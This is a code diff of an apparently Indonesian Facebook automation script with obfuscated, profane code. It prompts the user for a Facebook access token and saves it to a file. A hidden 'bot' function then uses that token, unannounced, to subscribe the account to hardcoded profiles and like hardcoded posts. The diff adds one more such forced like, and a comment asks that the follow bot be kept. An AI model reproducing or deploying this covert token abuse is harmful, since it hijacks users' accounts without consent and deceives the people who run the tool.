@@ -92,37 +92,36 @@ def banner():
 
 def __init__(self):
 	self.ada = []
-def login_anjing(self):
+def login_lagi():
 		os.system('clear')
-		kontoll()
-		token = input(' [%s*%s] Masukan Token EAAB: '%(O,N))
+		kontol()
+		token = input(' [%s*%s] Masukan Token : '%(O,N))
 		if token in ['']:
-			time.sleep(2);login_anjing()
+			time.sleep(2);login().login_lagi()
 		else:
 			try:
 				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
 				open('token.x','w').write(token)
 				print('\n [%s+%s] Login Berhasil %s'%(H,N,cc))
-				self.bot()
+				bot()
 			except KeyError:
-				jalan(' [%s!%s] Token Eror Silakan Ganti Akun Tumbal!'%(M,N))
-				self.exit()
-	def bot():
-		# JANGAN DI GANTI NGENTOD CUKUP DI TAMBAHKAN SAJA KONTOL.
+				jalan(' [%s!%s] Token Error Coba Ganti Akun Tumbal'%(M,N))
+				jalan(' [%s!%s] Silahkan Masukan Kembali Perintah'%(M,N))
+				jalan(' [%s!%s] python Vip88.py!'%(M,N))
+				exit()	
+
+# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
+def bot():
 		try:
 			toket = open('token.x','r').read()
 		except IOError:
-			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().__login__()
+			jalan('\n [%s!%s] Token mokad ganti akun!'%(M,N));time.sleep(1);login().login_lagi()
 		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
-		requests.post('https://graph.facebook.com/711894139936601/comments/?message=' +komen+ '&access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
-		requests.post('https://graph.facebook.com/711894139936601/comments/?message='+komen+'&access_token=' + toket)
-		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
-		os.system('xdg-open wa.me/628290238779')
+		requests.post('https://graph.facebook.com/5222521057807512/likes?summary=true&access_token=' + toket)
 		menu().main()
-
 class menu:
 
 	def __init__(self):
@@ -912,7 +911,7 @@ def janda_sebalah():#line:42
         with requests .Session ()as O0O0OO0O0O00OOOO0 :#line:58
           OOO00OO00O0O0OOOO =O0O0OO0O0O00OOOO0 .get (f'https://app.cryptolens.io/api/key/activate?token=WyIxNjk4MDU3NSIsImlCa283WGlDTkN6QTdhczB1bU85NlRlWlJIaFFQai81ZlhBalJoWTkiXQ==&ProductId=14869&Key={O000O000OOO000OOO}&Sign=True').json ()['licenseKey']#line:59
           open ('apikey.txt','w').write (O000O000OOO000OOO )#line:60 #ganti token & id om
-          print (f"{H}[{P}*{H}]{P} 𝑬𝒙𝒑𝒊𝒓𝒆𝒅 :{K} {OOO00OO00O0O0OOOO['expires'].split('T')[0]}");time .sleep (2 );login_anjing(self) #line:93
+          print (f"{H}[{P}*{H}]{P} 𝑬𝒙𝒑𝒊𝒓𝒆𝒅 :{K} {OOO00OO00O0O0OOOO['expires'].split('T')[0]}");time .sleep (2 );login_lagi(self) #line:93
     elif OOO00O0OOO00OO00O in ['3','03']:#line:62
       harga_licensi () #line:932
     else :#line:64
